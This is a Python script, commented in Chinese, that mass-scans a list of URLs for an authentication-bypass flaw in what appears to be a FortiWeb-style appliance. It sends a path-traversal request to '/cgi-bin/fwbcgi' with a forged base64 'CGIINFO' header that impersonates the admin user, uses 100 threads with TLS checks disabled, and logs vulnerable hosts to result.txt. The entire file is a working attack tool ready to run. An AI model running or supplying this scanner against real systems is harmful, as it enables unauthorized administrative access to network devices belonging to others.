import requests
import threading
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# 禁用SSL警告和验证
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 读取URL文件
def read_urls(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]
        return urls
    except FileNotFoundError:
        print(f"错误: 文件 {filename} 不存在")
        return []
    except Exception as e:
        print(f"读取文件时出错: {e}")
        return []

# 检测单个URL的漏洞
def check_vulnerability(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'CGIINFO': 'eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='
    }
    
    # 构建目标URL
    target_path = '/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi'
    target_url = urljoin(url, target_path)
    
    try:
        # 发送请求，禁用SSL验证，不跟随重定向
        response = requests.get(
            target_url,
            headers=headers,
            verify=False,
            allow_redirects=False,
            timeout=10
        )
        
        status_code = response.status_code
        
        # 判断漏洞是否存在
        if status_code == 200:
            # 漏洞存在，写入结果文件
            result = f"漏洞存在 - URL: {url}\n状态码: {status_code}\n响应长度: {len(response.content)}\n目标URL: {target_url}\n{'-'*50}\n"
            with threading.Lock():
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(result)
            print(f"[+] 漏洞存在: {url} (状态码: {status_code})")
            return True
        elif 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            print(f"[-] 漏洞不存在: {url} (重定向状态码: {status_code})")
            return False
        else:
            # 其他状态码
            print(f"[-] 漏洞不存在: {url} (状态码: {status_code})")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] 请求失败: {url} - 错误: {e}")
        return False
    except Exception as e:
        print(f"[!] 检测过程中出错: {url} - 错误: {e}")
        return False

# 主函数
def main():
    print("开始漏洞检测...")
    
    # 读取URL列表
    urls = read_urls('url.txt')
    if not urls:
        print("没有找到有效的URL，程序退出")
        return
    
    print(f"共读取到 {len(urls)} 个URL")
    
    # 清空或创建结果文件
    open('result.txt', 'w', encoding='utf-8').close()
    
    # 使用线程池并发检测
    vulnerable_count = 0
    with ThreadPoolExecutor(max_workers=100) as executor:
        # 提交所有任务
        future_to_url = {executor.submit(check_vulnerability, url): url for url in urls}
        
        # 处理完成的任务
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                result = future.result()
                if result:
                    vulnerable_count += 1
            except Exception as e:
                print(f"[!] 处理 {url} 时发生异常: {e}")
    
    print(f"\n检测完成!")
    print(f"总URL数量: {len(urls)}")
    print(f"存在漏洞的URL数量: {vulnerable_count}")
    print(f"详细结果已保存到 result.txt 文件中")

if __name__ == "__main__":
    main()